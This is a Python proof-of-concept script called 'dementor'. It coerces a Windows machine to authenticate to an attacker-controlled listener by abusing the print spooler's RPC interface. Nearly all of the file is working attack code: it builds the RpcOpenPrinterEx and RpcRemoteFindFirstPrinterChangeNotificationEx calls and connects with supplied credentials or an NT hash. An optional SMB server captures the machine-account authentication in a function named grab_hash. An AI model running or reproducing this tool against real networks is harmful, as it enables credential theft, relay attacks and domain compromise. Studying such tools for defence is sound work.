#!/usr/bin/env python

# abuse cases and better implementation from the original discoverer: https://github.com/leechristensen/SpoolSample
# some code from https://www.exploit-db.com/exploits/2879/

import os
import sys
import argparse
import binascii
import ConfigParser
from time import sleep
from threading import Thread
from impacket import smbserver, smb
from impacket.dcerpc.v5 import transport
from impacket.structure import Structure
from impacket.uuid import uuidtup_to_bin

MSRPC_UUID_SPOOLSS = uuidtup_to_bin(('12345678-1234-ABCD-EF00-0123456789AB', '1.0'))
target = ''
listener = ''
debug = False

show_banner = """
                                                                                               
     **                                                                                        
      **                                                         *                             
      **                                                        **                             
      **                                                        **                             
      **                                                      ********    ****    ***  ****    
  *** **      ***    *** **** ****       ***    ***  ****    ********    * ***  *  **** **** * 
 *********   * ***    *** **** ***  *   * ***    **** **** *    **      *   ****    **   ****  
**   ****   *   ***    **  **** ****   *   ***    **   ****     **     **    **     **         
**    **   **    ***   **   **   **   **    ***   **    **      **     **    **     **         
**    **   ********    **   **   **   ********    **    **      **     **    **     **         
**    **   *******     **   **   **   *******     **    **      **     **    **     **         
**    **   **          **   **   **   **          **    **      **     **    **     **         
**    **   ****    *   **   **   **   ****    *   **    **      **      ******      ***        
 *****      *******    ***  ***  ***   *******    ***   ***      **      ****        ***       
  ***        *****      ***  ***  ***   *****      ***   ***                                   
                                                                                               
        rough PoC to connect to spoolss to elicit machine account authentication
        implementation by @3xocyte, idea/discovery by @tifkin_, rediscovery and 
        code fixes for Windows 10/2016 by @elad_shamir
"""

# printer and listener struct
class type1(Structure):
    alignment = 4
    structure = (
        ('id', '<L'),    # printer name referent ID
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )

# client and user struct
class type2(Structure):
    alignment = 4
    structure = (
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )

# create RpcOpenPrinterEx struct
class OpenPrinterEx(Structure):
    alignment = 4
    opnum = 69
    structure = (
        ('printer', ':', type1),
        ('null', '<L=0'),
        ('str', '<L=0'),
        ('null2', '<L=0'),
        ('access', '<L=0x00020002'),
        ('level', '<L=1'),
        ('id1', '<L=1'),
        ('level2', '<L=131076'),   # user level 1 infolevel
        ('size', '<L=28'),
        ('id2', '<L=0x00020008'),    # client referent id
        ('id3', '<L=0x0002000c'),    # user referent id
        ('build', '<L=8000'),
        ('major', '<L=0'),
        ('minor', '<L=0'),
        ('processor', '<L=0'),
        ('client', ':', type2),
        ('user', ':', type2),
    )

# partialy create RemoteFindFirstPrinterChangeNotificationEx struct
class RemoteFindFirstPrinterChangeNotificationEx(Structure):
    alignment =4
    opnum = 65
    structure = (
        ('flags', '<L=0'),
        ('options', '<L=0'),
        ('server', ':', type1),
        ('local','<L=123'),                     # Printer local
    )

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def run(self):
        # mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global', 'server_name','server_name')
        smbConfig.set('global', 'server_os','Windows')
        smbConfig.set('global', 'server_domain','WORKGROUP')
        smbConfig.set('global', 'log_file','')
        smbConfig.set('global', 'credentials_file','')
        smbConfig.set("global", 'SMB2Support', 'True') 

        # fake ipc$
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$', 'comment', '')
        smbConfig.set('IPC$', 'read only', 'yes')
        smbConfig.set('IPC$', 'share type', '3')
        smbConfig.set('IPC$', 'path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.smb.processConfigFile()
        # unregister dangerous commands
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_CREATE_DIRECTORY)
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE_DIRECTORY)
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_RENAME)
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_DELETE)
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE)
        self.smb.unregisterSmbCommand(smb.SMB.SMB_COM_WRITE_ANDX)

        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

# build RpcOpenPrinterEx() struct
def open_printer(username, client):
    query = OpenPrinterEx()
    printer = "\\\\%s\x00" % (target)                   # blank printer
    query['printer'] = type1()
    query['printer']['id'] = 0x00020000                 # referent ID for printer
    query['printer']['max'] = len(printer)              # printer max size
    query['printer']['actual'] = len(printer)           # printer actual size
    query['printer']['str'] = printer.encode('utf_16_le')
    query['client'] = type2()
    query['client']['max'] = len(client)
    query['client']['actual'] = len(client)
    query['client']['str'] = client.encode('utf_16_le')
    query['user'] = type2()
    query['user']['max'] = len(username)
    query['user']['actual'] = len(username)
    query['user']['str'] = username.encode('utf_16_le')
    return query

# partially build RpcRemoteFindFirstPrinterChangeNotificationEx() struct
def rffpcnex():
    query = RemoteFindFirstPrinterChangeNotificationEx()
    server = '\\\\%s\x00' % (listener)                  # server
    query['server'] = type1()
    query['server']['id'] = 0x41414141                  # referent ID for server
    query['server']['max'] = len(server)                # server name max size
    query['server']['actual'] = len(server)             # server name actual size
    query['server']['str'] = server.encode('utf_16_le')
    return query

def call_open_printer(dce, user, client):
    global debug
    print "[*] getting context handle..."
    query = open_printer(user,client)
    try:
        dce.call(query.opnum, query)
        raw = dce.recv()
        if debug == True: print "[*] raw response: " + binascii.hexlify(raw)
        handle = raw[:20]
        if debug == True: print "[*] handle is: " + binascii.hexlify(handle)
    except Exception as e:
        print "[*] exception " + str(e)
        dce.disconnect()
        sys.exit()
    return handle

def grab_hash(dce, handle):
    global debug
    print "[*] sending RFFPCNEX..."
    # because I'm lazy
    options_container = (''
        '\x04\x00\x02\x00' # referent id
        '\x02\x00\x00\x00' # version
        '\xce\x55\x00\x00' # flags
        '\x02\x00\x00\x00' # count
        # notify options blob to unpack another day
        '\x08\x00\x02\x00\x02\x00\x00\x00\x00\x00\xce\x55\x00\x00'
        '\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x02\x00'
        '\x01\x00\x00\x00\xe0\x11\xbd\x8f\xce\x55\x00\x00\x01\x00'
        '\x00\x00\x10\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        '\x01\x00\x00\x00\x00\x00'
    )
    # call function to get method core
    query = rffpcnex()
    # hack to compensate for laziness
    full_query = handle
    full_query += str(query)
    full_query += options_container

    try:
        dce.call(query.opnum, full_query)
        raw = dce.recv()
        if debug == True: print "[*] raw response: " + binascii.hexlify(raw)
    except Exception as e:
        print "[*] exception " + str(e)
        dce.disconnect()
        sys.exit()

def create_connection(domain, username, password, ntlm):
    # set up connection prereqs
    # creds
    creds={}
    creds['username'] = username
    creds['password'] = password
    creds['domain'] = domain
    creds['nthash'] = ntlm
    # to transport
    stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % target
    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['nthash'])
    dce = rpctransport.get_dce_rpc()
    # actually connect
    print "[*] connecting to %s" % target
    try:
        dce.connect()
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            print "[*] access denied"
            sys.exit()
        else:
            print "[*] unhandled exception occured: " + str(e)
            sys.exit()
    # defines the printer endpoint
    try:
        dce.bind(MSRPC_UUID_SPOOLSS)
    except Exception as e:
        print "[*] unhandled exception: " + str(e)
        sys.exit()
    print "[+] bound to spoolss"
    return dce

def main():

    # globals
    global target
    global listener
    global debug
    global show_banner

    parser = argparse.ArgumentParser(add_help = True, description = "dementor - rough PoC to connect to spoolss to elicit machine account authentication (implementation by @3xocyte, idea/discovery by @tifkin_, rediscovery and code fixes by @elad_shamir)")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('--ntlm', action="store", default='', help='nt hash')
    parser.add_argument('--server', action='store_true', default=False, help='create smb listener')
    parser.add_argument('--debug', action="store_true", default=False, help='enable debugging')
    parser.add_argument('-q', '--banner', action="store_true", default=False,help='show banner')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')

    options = parser.parse_args()

    domain = options.domain
    username = options.username
    password = options.password
    ntlm = options.ntlm
    server = options.server
    listener = options.listener
    target = options.target
    debug = options.debug
    banner = options.banner

    if banner == True:
        print show_banner

    if server == True:
        print "[*] starting smb server..."
        server_thread = SMBServer()
        server_thread.daemon = True
        server_thread.start()
        sleep(1) # ensure server starts before continuing
        print "[+] server running"

    dce = create_connection(domain, username, password, ntlm)
    handle = call_open_printer(dce, domain+"\\"+username+"\x00", listener+"\x00")
    grab_hash(dce, handle)
    print "[+] done!"
    dce.disconnect()
    sys.exit()

if __name__ == '__main__':
    main()
